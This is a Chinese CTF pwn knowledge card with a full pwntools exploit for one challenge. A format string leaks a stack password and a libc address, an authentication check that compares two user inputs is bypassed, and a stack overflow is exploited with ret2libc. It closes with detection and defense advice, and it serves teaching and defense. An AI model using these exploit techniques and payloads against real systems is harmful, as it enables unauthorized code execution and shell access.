---
id: ctf-pwn-format-string-stack-secret-self-compare-auth-ret2libc
title: 格式化字符串 %N$s 直接读出栈上随机口令泄 libc：配合「两次输入相同即通过」的自证型认证码校验，进入 shell 溢出打 ret2libc
type: scenario
domain: ctf
path: ctf/pwn
technique: format-string-stack-secret-leak-self-compare-auth-ret2libc
tags:
- ctf
- pwn
- format-string
- libc-leak
- auth-bypass
- ret2libc
- logic-bug
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W8
  verified_at: '2026-11-09T02:40:45+08:00'
  notes: 已对照原文核对；本次核对未读取图片；正文 exp 的 sl(%7$s%39$p)、h64() 取 8 字节作口令、h164()-0x21b780 求 libc 基址、认证处两次输入 111、溢出偏移 0x28 与 pop_rdi=0x400661 / ret=pop_rdi+1 / system 的 ret2libc 链均与卡片一致。未验证点：原文只说 printf 泄露 s2 的值与 libc 信息，未明说口令是「随机生成」，卡内该表述为按语义推断；checksec（RELRO/PIE/Canary）仅在未读的截图中，卡内已按 exp 反推
url: /docs/ctf/pwn/ctf-pwn-format-string-stack-secret-self-compare-auth-ret2libc/
draft: false
kb_aliases:
- 格式化字符串泄栈上密码
- 7$s 格式串读栈上密码
- 两次输入相同即通过
- 自证型认证码校验
- 泄 libc 后 ret2libc
---

## 一句话结论

程序把随机生成的口令放在栈上，随后又把用户输入直接交给 `printf` 当格式串——一条 `%7$s%39$p` 就同时干了两件事：用 `%7$s` 把栈上那 8 字节口令原样打印出来，用 `%39$p` 泄一个 libc 内指针拿到基址；接着认证码校验的实现是「两次输入相等即通过」（比较的是两次用户输入，而不是与某个服务端秘密比对），于是拿回口令后重放同一值就过门，进入带栈溢出和 `/bin/sh` 的 shell 分支，用已泄露的 libc 打 ret2libc。

## 原理

- **`%N$s` 读栈上秘密**：`printf` 的第 N 个可变参数位置若正好落在保存口令的栈槽（本例口令是 8 字节、以指针或直接字节形式位于可控读取范围内），`%N$s` 会把它当 `char*` 解引用并按 C 字符串输出——不需要知道口令的生成算法，也不需要任何写原语。
- **同一条格式串顺带泄 libc**：`%39$p` 打印该位置的 8 字节值（通常是 libc 内的一个返回地址或指针），减去已知偏移（本例 `0x21b780`）即得基址；注意按 6 字节接收再补齐 8 字节，避免把后续输出混进地址。
- **自证型认证码校验为什么必然被绕过**：代码形如「输入 code1；输入 code2；若 `strcmp(code1, code2)==0` 则通过」。这里根本没有秘密参与比对，攻击者发两次相同字符串即可，校验逻辑退化为「确认你没有打错字」。这类 bug 的判据是：**比较的两个操作数都来自同一个输入通道**。
- **为什么要先过认证再打溢出**：溢出点在认证通过之后的 shell 分支里，认证是纯粹的前置门禁；因此整条链的难度完全落在「口令怎么来得」与「libc 基址怎么来得」上，而这两件事被同一条格式串一次解决。
- **ret2libc 的必要条件**：能读到 libc 内某个固定符号的真实地址（本例 `%39$p`），并且二进制里有 `pop rdi; ret` 类 gadget（本例 0x400661）与可用的 `ret` 做栈对齐；PIE 与否不影响，因为链上地址都是「libc 基址 + 偏移」。

## 触发条件

- 程序存在 `printf(user_input)` 这类把输入当格式串的调用，且该调用发生在认证流程之前或之中。
- 口令/令牌等秘密以明文形式存在于栈上可被 `%N$s` 命中的位置（生成后未清零、未搬移到堆上加密存放）。
- 认证码校验比较两次用户输入（或比较用户输入与用户可控的派生值），不存在服务端秘密。
- 认证通过后存在栈溢出点（本例 shell 分支 `read` 长度大于缓冲区）与可达的 `system`/`/bin/sh`。
- 目标不限制格式串字符（或未对 `%` 做过滤）。

## 利用步骤

1. 先用 `%p` 系列扫栈，确认口令所在参数序号（本例第 7 位）与 libc 指针所在序号（第 39 位）。
2. 一次性发送 `%7$s%39$p`：先读 8 字节作为口令（若口令非 8 字节，`%s` 会一直打印到 NUL，需按分隔符切分），再读 6 字节补零作为 libc 指针。
3. 计算 `libc_base = leak - 0x21b780`（偏移按目标 libc 调整），并用 `libc.sym['system']`、`libc.search(b'/bin/sh')` 求地址。
4. 认证码校验：两次输入同一个值（如 `111`）即可通过，确认门禁已过。
5. 进入 shell 分支后发溢出 payload：`b'A' * 0x28 + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)`，`ret` 用于 16 字节栈对齐。
6. 若第一次收到的口令字节含 `\x00`/换行被截断，改用 `%7$s` 配合已知分隔符解析，或换成逐字节 `%N$c` 读法。

## PoC

```python
from pwn import *
context(arch='amd64', os='linux')

io = remote(host, port)
libc = ELF('./libc.so.6')

# 一条格式串：先读栈上 8 字节口令，再泄 libc 内指针
io.sendline(b'%7$s%39$p')
io.recvuntil(b'Welcome, \n')

secret = u64(io.recv(8))                       # 口令本身（8 字节）
libc_base = u64(io.recv(6).ljust(8, b'\x00')) - 0x21b780
log.success(f'secret={secret:#x} libc={libc_base:#x}')

# 认证：把读到的口令原样交回
io.send(p64(secret))
io.recvuntil(b'Please enter your authentication code: \n')
io.sendline(b'111')
io.sendline(b'111')                            # 两次输入相同即通过
io.recvuntil(b'>\n')

pop_rdi = 0x400661
ret     = pop_rdi + 1
bin_sh  = libc_base + next(libc.search(b'/bin/sh\x00'))
system  = libc_base + libc.sym['system']

io.send(b'A' * 0x28 + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system))
io.interactive()
```

## 变体与关联

- **变体一（口令不在栈上）**：若口令被放在堆或全局区，`%N$s` 读不到，需要先泄一个指向它的指针（`%N$p`）再二次 `%N$s` 解引用，或改用 `%N$s` + 偏移读。
- **变体二（只泄信息不 RCE）**：仅有格式串泄口令、没有溢出点时，可拿口令登录后台，把危害转移到业务侧（配置修改、数据导出）。
- **变体三（认证码校验的其它错误形态）**：比较 `code1 == code2`、比较用户输入与其哈希、验证码回显在响应里，本质都是「秘密不存在或可从输入推出」。
- **关联**：[[ctf-pwn-login-failure-prints-correct-password]]（同属「秘密泄露后二次认证」的思路，但泄露来自失败分支主动打印明文口令，本条来自格式串读栈）、[[ctf-pwn-format-canary-uaf-unsorted-ret2libc-all-protections]]（`%7$p` 泄 canary + UAF 泄 unsorted bin 泄漏，本条是 `%N$s` 读栈上秘密 + `%N$p` 泄 libc）、[[binary-pwn-format-string-got-hijack]]（`%N$s` 任意读的原理与 GOT 定位）、[[ctf-pwn-offbynull-stack-migration-format-leak-ret2libc]]（同用 `printf(format)` 泄 libc 后 ret2libc，但入口是 off-by-null 栈迁移）。

## 检测与防御

- **根治**：任何把用户输入当格式串的调用都必须改成 `printf("%s", buf)`；编译期开启 `-Wformat-security` 与 `-Werror=format-security`。
- **秘密管理**：口令/令牌生成后用局部变量并立刻使用、用完 `explicit_bzero` 清零，不要驻留在栈上等格式串来读；能不放进程内存就不放（用哈希比对）。
- **认证逻辑**：认证码必须与服务端秘密比对（`hmac.compare_digest`），绝不能「两次用户输入互相比较」；输入校验与业务门禁要分开，不能靠「猜对同一个值」当门禁。
- **检测信号**：请求中出现 `%p`、`%N$p`、`%N$s`、`%N$n` 等序列；同一连接先发格式串再发二进制 payload；认证码两次提交完全相同且与任何服务端下发值不同。
- **加固**：开启 ASLR/PIE/Full RELRO 提高泄漏后利用成本；对 `printf` 类函数做 RASP/编译期替换。
